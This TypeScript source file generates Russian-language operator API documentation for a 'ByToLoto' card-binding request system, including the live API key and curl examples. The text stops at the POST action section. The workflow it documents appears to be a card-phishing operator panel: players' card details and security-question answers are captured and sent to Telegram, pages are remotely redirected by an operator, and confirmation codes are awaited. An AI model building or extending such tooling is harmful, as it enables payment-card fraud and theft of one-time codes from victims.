import "server-only"

/** Operator API reference as Markdown, with the live key embedded. Served only to an admin session. */
export function buildApiDocs({ baseUrl, apiKey, generatedAt }: { baseUrl: string; apiKey: string | null; generatedAt: Date }) {
  const key = apiKey ?? "<OPERATOR_API_KEY не задан на сервере>"
  const api = `${baseUrl}/api/v1`
  const stamp = new Intl.DateTimeFormat("ru-RU", { dateStyle: "long", timeStyle: "short", timeZone: "Europe/Moscow" }).format(generatedAt)

  return `# ByToLoto — API заявок на привязку карт

Сформировано: ${stamp} (МСК)

> Документ содержит действующий ключ API. Не пересылайте его третьим лицам.
> Если ключ утёк, замените \`OPERATOR_API_KEY\` в \`/opt/bytoloto/.env\` и перезапустите сайт (\`bash deploy/deploy.sh\`).

## Доступ

| Параметр | Значение |
| --- | --- |
| Базовый адрес | \`${api}\` |
| Ключ API | \`${key}\` |
| Формат | JSON, UTF-8 |
| Авторизация | заголовок \`Authorization: Bearer <ключ>\` |

Без ключа или с неверным ключом сервер отвечает \`401 Unauthorized\`. Если ключ не задан на сервере — \`503\`.

## Как устроена заявка

1. Игрок вводит карту и нажимает «Сохранить». Создаётся заявка с уникальным номером вида \`BL-XXXXXX\`
   (6 символов из \`A–Z\` и \`2–9\`, без похожих \`I\`, \`O\`, \`0\`, \`1\`).
2. Через 2 секунды игрок видит контрольный вопрос. Ответ сохраняется в заявке (поле \`secretAnswer\`) и приходит в Telegram.
3. Оператор отправляет игроку ссылку (\`redirect\`) — страница игрока сама переходит по ней в течение нескольких секунд.
4. Оператор закрывает заявку: \`approve\` (карта привязана) или \`reject\` (игрок видит сообщение об отклонении, карта не добавляется).

### Статусы

| Статус | Значение |
| --- | --- |
| \`pending\` | заявка создана, ответа на вопрос ещё нет |
| \`code_requested\` | ожидается код подтверждения |
| \`extra_check\` | игрок ответил на контрольный вопрос |
| \`confirmed\` | карта подтверждена (финальный) |
| \`rejected\` | карта отклонена (финальный) |

По заявкам в финальном статусе \`redirect\`, \`approve\` и \`reject\` больше не работают (ответ \`409\`).

### Объект заявки

\`\`\`json
{
  "requestNo": "BL-7K2QXM",
  "status": "extra_check",
  "brand": "Visa",
  "bankName": "Сбербанк",
  "last4": "2222",
  "cardholder": "IVAN IVANOV",
  "secretAnswer": "ответ игрока",
  "redirectUrl": null,
  "createdAt": "2026-05-10T18:20:00.000Z",
  "processedAt": null
}
\`\`\`

\`secretAnswer\`, \`redirectUrl\`, \`processedAt\`, \`bankName\` могут быть \`null\`. Даты — ISO 8601 в UTC.

## Методы

### 1. Список заявок

\`GET /card-requests\`

| Параметр | Обязателен | Описание |
| --- | --- | --- |
| \`status\` | нет | фильтр по статусу из таблицы выше |
| \`limit\` | нет | от 1 до 200, по умолчанию 50 |

Сортировка: сначала новые.

\`\`\`bash
curl -s "${api}/card-requests?status=extra_check&limit=20" \\
  -H "Authorization: Bearer ${key}"
\`\`\`

Ответ \`200\`:

\`\`\`json
{ "requests": [ { "requestNo": "BL-7K2QXM", "status": "extra_check", "...": "..." } ] }
\`\`\`

Ошибка \`400\` — неизвестный статус.

### 2. Одна заявка

\`GET /card-requests/{requestNo}\`

\`\`\`bash
curl -s "${api}/card-requests/BL-7K2QXM" \\
  -H "Authorization: Bearer ${key}"
\`\`\`

Ответ \`200\`: \`{ "request": { ... } }\`. Ошибка \`404\` — заявки нет или номер в неверном формате.
Номер можно передавать в любом регистре.

### 3. Действие по заявке

\`POST /card-requests/{requestNo}\`
